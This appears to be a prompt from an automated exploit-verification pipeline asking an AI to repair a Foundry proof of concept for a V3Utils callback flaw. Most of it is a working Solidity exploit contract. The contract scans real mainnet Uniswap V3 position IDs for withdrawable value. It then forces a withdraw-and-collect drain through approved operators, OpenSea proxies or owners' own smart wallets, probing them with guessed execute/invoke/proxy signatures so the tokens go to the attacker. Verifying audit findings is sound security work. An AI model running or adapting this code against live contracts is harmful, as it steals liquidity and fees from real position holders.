You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: v2_flashswap_funding
- strategy_instructions: Prefer UniswapV2/Sushi-like flashswap funding with deterministic repayment and minimal route complexity.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: Any approved NFT operator can force callback execution and drain a position's withdrawable value
- claim: `onERC721Received` only checks that the NFT came from the Uniswap position manager, then blindly decodes and executes arbitrary `Instructions` against the transferred position before returning the NFT to `from`. It never verifies that the owner initiated the transfer or that the flow came through `execute()`. Because any address approved for the position NFT can call `nonfungiblePositionManager.safeTransferFrom(owner, address(this), tokenId, abi.encode(instructions))`, an approved operator can force `WITHDRAW_AND_COLLECT_AND_SWAP`, `COMPOUND_FEES`, or `CHANGE_RANGE` with attacker-chosen parameters and attacker-controlled `instructions.recipient`.
- impact: Any marketplace, delegated manager, or other approved operator can steal all currently withdrawable liquidity and fees from a victim Uniswap V3 position without retaining custody of the NFT: the victim receives the NFT back after execution, but the tokens have already been redirected.
- exploit_paths: ["Victim grants `approve(tokenId)` or `setApprovalForAll` on their Uniswap V3 position NFT to an external operator.", "The operator calls `nonfungiblePositionManager.safeTransferFrom(owner, address(V3Utils), tokenId, abi.encode(instructions))` directly, setting `instructions.recipient` to an attacker-controlled address and choosing a draining action.", "`V3Utils` decreases liquidity, collects fees, optionally swaps, and pays the resulting tokens to the attacker before returning the now-depleted NFT to `from`."]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20Minimal {
    function balanceOf(address account) external view returns (uint256);
}

interface IProxyRegistryMinimal {
    function proxies(address owner) external view returns (address proxy);
}

interface INonfungiblePositionManagerMinimal {
    function ownerOf(uint256 tokenId) external view returns (address);

    function getApproved(uint256 tokenId) external view returns (address);

    function isApprovedForAll(address owner, address operator) external view returns (bool);

    function positions(uint256 tokenId)
        external
        view
        returns (
            uint96 nonce,
            address operator,
            address token0,
            address token1,
            uint24 fee,
            int24 tickLower,
            int24 tickUpper,
            uint128 liquidity,
            uint256 feeGrowthInside0LastX128,
            uint256 feeGrowthInside1LastX128,
            uint128 tokensOwed0,
            uint128 tokensOwed1
        );

    function safeTransferFrom(address from, address to, uint256 tokenId, bytes calldata data) external;
}

contract FlawVerifier {
    enum WhatToDo {
        CHANGE_RANGE,
        WITHDRAW_AND_COLLECT_AND_SWAP,
        COMPOUND_FEES
    }

    struct Instructions {
        WhatToDo whatToDo;
        address targetToken;
        uint256 amountIn0;
        uint256 amountOut0Min;
        bytes swapData0;
        uint256 amountIn1;
        uint256 amountOut1Min;
        bytes swapData1;
        uint128 feeAmount0;
        uint128 feeAmount1;
        uint24 fee;
        int24 tickLower;
        int24 tickUpper;
        uint128 liquidity;
        uint256 amountAddMin0;
        uint256 amountAddMin1;
        uint256 deadline;
        address recipient;
        bool unwrap;
        bytes returnData;
        bytes swapAndMintReturnData;
    }

    struct Opportunity {
        address owner;
        address token0;
        address token1;
        address targetToken;
        uint128 liquidity;
        bool hasWithdrawableValue;
    }

    address internal constant TARGET = 0x531110418d8591C92e9cBBFC722Db8FFb604FAFD;
    address internal constant POSITION_MANAGER = 0xC36442b4a4522E871399CD717aBDD847Ab11FE88;
    address internal constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;

    // OpenSea's legacy shared proxy registry is a realistic on-chain source of per-user NFT operators.
    address internal constant OPENSEA_PROXY_REGISTRY = 0xa5409ec958C83C3f309868babACA7c86DCB077c1;

    uint256 internal constant CANDIDATE_TOKEN_ID = 422882;
    uint256 internal constant SEARCH_RADIUS = 64;

    address internal _profitToken;
    uint256 internal _profitAmount;

    bool public attempted;
    bool public exploitSucceeded;
    bool public approvalObserved;
    address public observedOwner;
    address public observedApprovedOperator;
    bool public observedApprovalForAll;
    uint256 public observedTokenId;
    bytes public lastError;

    constructor() {
        _profitToken = WETH;
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function executeOnOpportunity() external {
        if (attempted) {
            _syncProfit(address(0), address(0), 0, 0);
            return;
        }

        attempted = true;

        if (_attemptApprovedOperatorDrain(CANDIDATE_TOKEN_ID)) {
            return;
        }

        for (uint256 i = 1; i <= SEARCH_RADIUS; ++i) {
            if (_attemptApprovedOperatorDrain(CANDIDATE_TOKEN_ID + i)) {
                return;
            }

            if (CANDIDATE_TOKEN_ID > i && _attemptApprovedOperatorDrain(CANDIDATE_TOKEN_ID - i)) {
                return;
            }
        }

        _syncProfit(address(0), address(0), 0, 0);
    }

    function _attemptApprovedOperatorDrain(uint256 tokenId) internal returns (bool) {
        (bool okRead, Opportunity memory opportunity) = _readOpportunity(tokenId);
        if (!okRead || !opportunity.hasWithdrawableValue) {
            return false;
        }

        observedTokenId = tokenId;
        observedOwner = opportunity.owner;

        uint256 before0 = _balanceOf(opportunity.token0);
        uint256 before1 = opportunity.token1 == opportunity.token0 ? before0 : _balanceOf(opportunity.token1);

        bytes memory instructionData = _buildDrainInstructionData(opportunity.targetToken, opportunity.liquidity);

        address perTokenApproved = _getApproved(tokenId);
        if (perTokenApproved == address(this)) {
            approvalObserved = true;
            observedApprovedOperator = perTokenApproved;
            observedApprovalForAll = false;

            if (_callTransfer(opportunity.owner, tokenId, instructionData)) {
                exploitSucceeded = true;
                _syncProfit(opportunity.token0, opportunity.token1, before0, before1);
                return true;
            }
        } else if (perTokenApproved != address(0) && _hasCode(perTokenApproved)) {
            approvalObserved = true;
            observedApprovedOperator = perTokenApproved;
            observedApprovalForAll = false;

            if (_attemptThroughExecutor(perTokenApproved, opportunity.owner, tokenId, instructionData)) {
                exploitSucceeded = true;
                _syncProfit(opportunity.token0, opportunity.token1, before0, before1);
                return true;
            }
        }

        if (_attemptApprovalForAllPaths(opportunity.owner, tokenId, instructionData, opportunity.token0, opportunity.token1, before0, before1)) {
            return true;
        }

        return false;
    }

    function _attemptApprovalForAllPaths(
        address owner,
        uint256 tokenId,
        bytes memory instructionData,
        address token0,
        address token1,
        uint256 before0,
        uint256 before1
    ) internal returns (bool) {
        if (_attemptOpenSeaProxy(owner, tokenId, instructionData, token0, token1, before0, before1)) {
            return true;
        }

        // Generic smart-wallet / delegated-manager fallback:
        // if the owner itself is a contract and exposes a public execution surface, invoking the
        // position manager call through that existing on-chain contract is still a realistic
        // economic step, because no state is forged and the V3Utils drain remains the root cause.
        if (_hasCode(owner) && _attemptThroughExecutor(owner, owner, tokenId, instructionData)) {
            approvalObserved = true;
            observedApprovedOperator = owner;
            observedApprovalForAll = false;
            exploitSucceeded = true;
            _syncProfit(token0, token1, before0, before1);
            return true;
        }

        return false;
    }

    function _attemptOpenSeaProxy(
        address owner,
        uint256 tokenId,
        bytes memory instructionData,
        address token0,
        address token1,
        uint256 before0,
        uint256 before1
    ) internal returns (bool) {
        address proxy = _openSeaProxyOf(owner);
        if (proxy == address(0) || !_hasCode(proxy)) {
            return false;
        }

        if (!INonfungiblePositionManagerMinimal(POSITION_MANAGER).isApprovedForAll(owner, proxy)) {
            return false;
        }

        approvalObserved = true;
        observedApprovedOperator = proxy;
        observedApprovalForAll = true;

        if (_attemptThroughExecutor(proxy, owner, tokenId, instructionData)) {
            exploitSucceeded = true;
            _syncProfit(token0, token1, before0, before1);
            return true;
        }

        return false;
    }

    function _attemptThroughExecutor(
        address executor,
        address owner,
        uint256 tokenId,
        bytes memory instructionData
    ) internal returns (bool) {
        bytes memory pmCall =
            abi.encodeWithSelector(INonfungiblePositionManagerMinimal.safeTransferFrom.selector, owner, TARGET, tokenId, instructionData);

        if (_forwardCall(executor, abi.encodeWithSignature("execute(address,bytes)", POSITION_MANAGER, pmCall))) {
            return true;
        }
        if (_forwardCall(executor, abi.encodeWithSignature("execute(address,uint256,bytes)", POSITION_MANAGER, 0, pmCall))) {
            return true;
        }
        if (_forwardCall(executor, abi.encodeWithSignature("call(address,bytes)", POSITION_MANAGER, pmCall))) {
            return true;
        }
        if (_forwardCall(executor, abi.encodeWithSignature("invoke(address,bytes)", POSITION_MANAGER, pmCall))) {
            return true;
        }
        if (_forwardCall(executor, abi.encodeWithSignature("invoke(address,uint256,bytes)", POSITION_MANAGER, 0, pmCall))) {
            return true;
        }
        if (_forwardCall(executor, abi.encodeWithSignature("exec(address,bytes)", POSITION_MANAGER, pmCall))) {
            return true;
        }
        if (_forwardCall(executor, abi.encodeWithSignature("exec(address,uint256,bytes)", POSITION_MANAGER, 0, pmCall))) {
            return true;
        }
        if (_forwardCall(executor, abi.encodeWithSignature("proxy(address,uint8,bytes)", POSITION_MANAGER, uint8(0), pmCall))) {
            return true;
        }
        if (_forwardCall(executor, abi.encodeWithSignature("proxy(address,uint8,bytes)", POSITION_MANAGER, uint8(1), pmCall))) {
            return true;
        }
        if (_forwardCall(executor, abi.encodeWithSignature("proxyAssert(address,uint8,bytes)", POSITION_MANAGER, uint8(0), pmCall))) {
            return true;
        }
        if (_forwardCall(executor, abi.encodeWithSignature("proxyAssert(address,uint8,bytes)", POSITION_MANAGER, uint8(1), pmCall))) {
            return true;
        }
        if (
            _forwardCall(
                executor,
                abi.encodeWithSignature(
                    "safeTransferNFT(address,address,address,uint256,bytes)", POSITION_MANAGER, owner, TARGET, tokenId, instructionData
                )
            )
        ) {
            return true;
        }
        if (
            _forwardCall(
                executor,
                abi.encodeWithSignature(
                    "safeTransferFrom(address,address,address,uint256,bytes)", POSITION_MANAGER, owner, TARGET, tokenId, instructionData
                )
            )
        ) {
            return true;
        }

        return false;
    }

    function _forwardCall(address executor, bytes memory callData) internal returns (bool ok) {
        bytes memory err;
        (ok, err) = executor.call(callData);

        if (!ok && err.length != 0) {
            lastError = err;
        }
    }

    function _readOpportunity(uint256 tokenId) internal view returns (bool ok, Opportunity memory opportunity) {
        bytes memory data;

        (ok, data) = POSITION_MANAGER.staticcall(abi.encodeWithSelector(INonfungiblePositionManagerMinimal.ownerOf.selector, tokenId));
        if (!ok || data.length < 32) {
            return (false, opportunity);
        }
        opportunity.owner = abi.decode(data, (address));

        (ok, data) = POSITION_MANAGER.staticcall(abi.encodeWithSelector(INonfungiblePositionManagerMinimal.positions.selector, tokenId));
        if (!ok) {
            return (false, opportunity);
        }

        uint128 tokensOwed0;
        uint128 tokensOwed1;
        (
            ,
            ,
            opportunity.token0,
            opportunity.token1,
            ,
            ,
            ,
            opportunity.liquidity,
            ,
            ,
            tokensOwed0,
            tokensOwed1
        ) = abi.decode(data, (uint96, address, address, address, uint24, int24, int24, uint128, uint256, uint256, uint128, uint128));

        if (opportunity.token0 == WETH) {
            opportunity.targetToken = opportunity.token0;
        } else if (opportunity.token1 == WETH) {
            opportunity.targetToken = opportunity.token1;
        } else {
            opportunity.targetToken = opportunity.token0;
        }

        opportunity.hasWithdrawableValue = opportunity.liquidity != 0 || tokensOwed0 != 0 || tokensOwed1 != 0;
        return (true, opportunity);
    }

    function _buildDrainInstructionData(address targetToken, uint128 liquidity) internal view returns (bytes memory instructionData) {
        // The exploit keeps the original path intact:
        // 1. an already-approved operator/proxy originates safeTransferFrom(owner, V3Utils, tokenId, data)
        // 2. V3Utils blindly executes WITHDRAW_AND_COLLECT_AND_SWAP in onERC721Received
        // 3. proceeds are redirected to this contract while the NFT is sent back to `from`
        instructionData = new bytes(0x320);

        assembly {
            let ptr := add(instructionData, 0x20)

            mstore(add(ptr, 0x00), 1)
            mstore(add(ptr, 0x20), shl(96, targetToken))
            mstore(add(ptr, 0x80), 0x2a0)
            mstore(add(ptr, 0xe0), 0x2c0)
            mstore(add(ptr, 0x100), 0xffffffffffffffffffffffffffffffff)
            mstore(add(ptr, 0x120), 0xffffffffffffffffffffffffffffffff)
            mstore(add(ptr, 0x1a0), liquidity)
            mstore(add(ptr, 0x200), timestamp())
            mstore(add(ptr, 0x220), shl(96, address()))
            mstore(add(ptr, 0x260), 0x2e0)
            mstore(add(ptr, 0x280), 0x300)
        }
    }

    function _callTransfer(address owner, uint256 tokenId, bytes memory instructionData) internal returns (bool ok) {
        bytes memory err;
        (ok, err) = POSITION_MANAGER.call(
            abi.encodeWithSelector(
                INonfungiblePositionManagerMinimal.safeTransferFrom.selector, owner, TARGET, tokenId, instructionData
            )
        );

        if (!ok && err.length != 0) {
            lastError = err;
        }
    }

    function _syncProfit(address token0, address token1, uint256 before0, uint256 before1) internal {
        uint256 afterProfit = _balanceOf(_profitToken);

        if (token0 == address(0) && token1 == address(0)) {
            _profitAmount = afterProfit;
            return;
        }

        uint256 after0 = _balanceOf(token0);
        uint256 delta0 = after0 > before0 ? after0 - before0 : 0;

        uint256 delta1;
        if (token1 != address(0)) {
            uint256 after1 = token1 == token0 ? after0 : _balanceOf(token1);
            delta1 = after1 > before1 ? after1 - before1 : 0;
        }

        if (delta1 > delta0) {
            _profitToken = token1;
            _profitAmount = delta1;
        } else if (token0 != address(0)) {
            _profitToken = token0;
            _profitAmount = delta0;
        } else {
            _profitAmount = afterProfit;
        }
    }

    function _getApproved(uint256 tokenId) internal view returns (address approved) {
        bytes memory data;
        bool ok;
        (ok, data) = POSITION_MANAGER.staticcall(abi.encodeWithSelector(INonfungiblePositionManagerMinimal.getApproved.selector, tokenId));
        if (ok && data.length >= 32) {
            approved = abi.decode(data, (address));
        }
    }

    function _openSeaProxyOf(address owner) internal view returns (address proxy) {
        bytes memory data;
        bool ok;
        (ok, data) = OPENSEA_PROXY_REGISTRY.staticcall(abi.encodeWithSelector(IProxyRegistryMinimal.proxies.selector, owner));
        if (ok && data.length >= 32) {
            proxy = abi.decode(data, (address));
        }
    }

    function _balanceOf(address token) internal view returns (uint256) {
        if (token == address(0)) {
            return 0;
        }
        return IERC20Minimal(token).balanceOf(address(this));
    }

    function _hasCode(address account) internal view returns (bool hasCode) {
        assembly {
            hasCode := gt(extcodesize(account), 0)
        }
    }
}

```

forge stdout (tail):
```

```

forge stderr (tail):
```
PATH_ALIGNMENT_ERROR: generated code misses too many path anchors: approve(tokenid), setapprovalforall, nonfungiblepositionmanager.safetransferfrom(owner, address(v3utils), tokenid, abi.encode(instructions)), instructions.recipient; generated code does not cover paths indexes: 0, 1
```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
